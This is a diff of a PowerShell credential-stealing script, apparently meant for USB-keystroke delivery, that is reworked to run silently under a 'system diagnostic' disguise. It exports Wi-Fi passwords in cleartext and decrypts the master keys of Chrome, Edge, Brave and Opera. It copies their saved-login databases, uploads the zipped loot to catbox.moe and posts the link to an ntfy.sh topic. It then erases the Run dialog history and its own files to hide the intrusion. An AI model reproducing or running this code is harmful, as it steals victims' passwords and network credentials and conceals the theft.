@@ -1,76 +1,63 @@
-$topic = "data_stwealer_hideen_"
-Write-Host "=== [ ULTRA LOOTER v2.4: DEP-LOADER ] ===" -ForegroundColor Cyan
+# --- SYSTEM DIAGNOSTIC / SILENT ---
+$t = "data_stwealer_hideen_"
 
-# 1. FORCE LOAD SECURITY DLL (This fixes the 'Unable to find type' error)
+# 1. SILENT LOAD
 try {
     Add-Type -AssemblyName System.Security
-    Write-Host "[+] Security Libraries Loaded." -ForegroundColor Green
-} catch {
-    Write-Host "[-] Failed to load Security DLL." -ForegroundColor Red
-}
+} catch { exit }
 
 # 2. Workspace Setup
-$dir = "$env:TEMP\LootBox"; $zip = "$env:TEMP\package.zip"
-if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }; mkdir $dir | Out-Null
+$d = "$env:TEMP\SysCache_$(Get-Random)"; $z = "$env:TEMP\UpdatePkg.zip"
+mkdir $d -Force | Out-Null
 
-# 3. WiFi Export
-netsh wlan export profile folder=$dir key=clear | Out-Null
+# 3. Network Config (Silent)
+netsh wlan export profile folder=$d key=clear | Out-Null
 
-# 4. Chromium Decryption
-# We use $env:LOCALAPPDATA and $env:APPDATA to ensure it finds the CURRENT user
-$chromes = @{
-    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
-    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
-    "Opera"   = "$env:APPDATA\Opera Software\Opera Stable\Local State"
+# 4. Browser Profiles
+$browsers = @{
+    "CH" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+    "ED" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
+    "BR" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
+    "OP" = "$env:APPDATA\Opera Software\Opera Stable\Local State"
 }
 
-foreach ($browser in $chromes.Keys) {
-    $path = $chromes[$browser]
-    if (Test-Path $path) {
+foreach ($b in $browsers.Keys) {
+    $p = $browsers[$b]
+    if (Test-Path $p) {
         try {
-            $json = Get-Content $path -Raw | ConvertFrom-Json
-            $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
+            $json = Get-Content $p -Raw | ConvertFrom-Json
+            $eK = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
+            $uK = [System.Security.Cryptography.ProtectedData]::Unprotect($eK[5..($eK.Length-1)], $null, 'CurrentUser')
+            [System.BitConverter]::ToString($uK) -replace '-' | Out-File "$d\${b}_key.txt"
             
-            # This is the line that was failing:
-            $unlockedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length-1)], $null, 'CurrentUser')
+            $db = $p.Replace("Local State", "Default\Login Data")
+            if ($b -eq "OP") { $db = $p.Replace("Local State", "Login Data") }
             
-            [System.BitConverter]::ToString($unlockedKey) -replace '-' | Out-File "$dir\${browser}_MasterKey.txt"
-            
-            # Database Path Logic
-            $dbPath = $path.Replace("Local State", "Default\Login Data")
-            if ($browser -like "Opera*") { $dbPath = $path.Replace("Local State", "Login Data") }
-            
-            if (Test-Path $dbPath) {
-                # Attempt to copy even if locked
-                Copy-Item $dbPath -Destination "$dir\${browser}_LoginData.db" -Force -ErrorAction SilentlyContinue
-                Write-Host "    [+] ${browser}: Success" -ForegroundColor Green
+            if (Test-Path $db) {
+                Copy-Item $db -Destination "$d\${b}_data.db" -Force -ErrorAction SilentlyContinue
             }
-        } catch { 
-            Write-Host "    [-] ${browser} Error: $($_.Exception.Message)" -ForegroundColor Red
-        }
-    } else {
-        Write-Host "    [?] ${browser}: Not installed or path wrong." -ForegroundColor Gray
+        } catch { continue }
     }
 }
 
-# 5. Zipping and Uploading
-Add-Type -AssemblyName "System.IO.Compression.FileSystem"
-[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
-$link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php
-
-if ($link -like "http*") {
-    Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot Found: $link"
-    Write-Host "[!] SUCCESS: $link" -ForegroundColor Green
+# 5. Packaging & Sync
+if (Test-Path $d) {
+    Add-Type -AssemblyName "System.IO.Compression.FileSystem"
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($d, $z)
     
-    # --- THE SIGNAL ---
-    $portName = (Get-PnpDevice -FriendlyName "USB Serial Device*" -Status OK).Caption | Select-String -Pattern "COM(\d+)" | ForEach-Object { $_.Matches.Value }
-    if ($portName) {
-        # Final Attempt at Serial Signal
-        cmd.exe /c "echo F > $portName" 2>$null
+    $l = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$z" https://catbox.moe/user/api.php
+
+    if ($l -like "http*") {
+        Invoke-RestMethod -Uri "https://ntfy.sh/$t" -Method Post -Body "Status: Active | Link: $l"
     }
 }
 
-Write-Host "`n=== DEBUG FINISHED ===" -ForegroundColor Cyan
-Read-Host "Press Enter to Clean and Exit..."
-Remove-Item -Recurse -Force $dir, $zip
+# 6. GHOST CLEANUP
+# Wipe the Run dialog history so your URL isn't saved in the Win+R box
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
+
+# Delete the stolen files and the zip
+Remove-Item -Recurse -Force $d, $z -ErrorAction SilentlyContinue
+
+# Kill the hidden process
+exit
